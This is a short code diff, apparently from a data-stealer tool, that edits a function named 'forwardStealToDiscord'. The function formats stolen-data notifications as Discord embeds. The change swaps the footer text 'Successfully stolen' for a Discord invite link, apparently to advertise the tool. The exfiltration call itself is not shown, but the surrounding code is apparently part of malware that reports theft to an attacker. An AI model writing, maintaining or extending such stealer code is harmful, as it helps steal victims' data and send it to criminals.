@@ -269,7 +269,7 @@ async function forwardStealToDiscord(payload) {
         inline: false,
       },
     ],
-    footer: { text: 'Successfully stolen' },
+    footer: { text: 'discord.gg/exenotifier' },
     timestamp: isoTs,
     ...(imageUrl ? { thumbnail: { url: imageUrl } } : {}),
   };
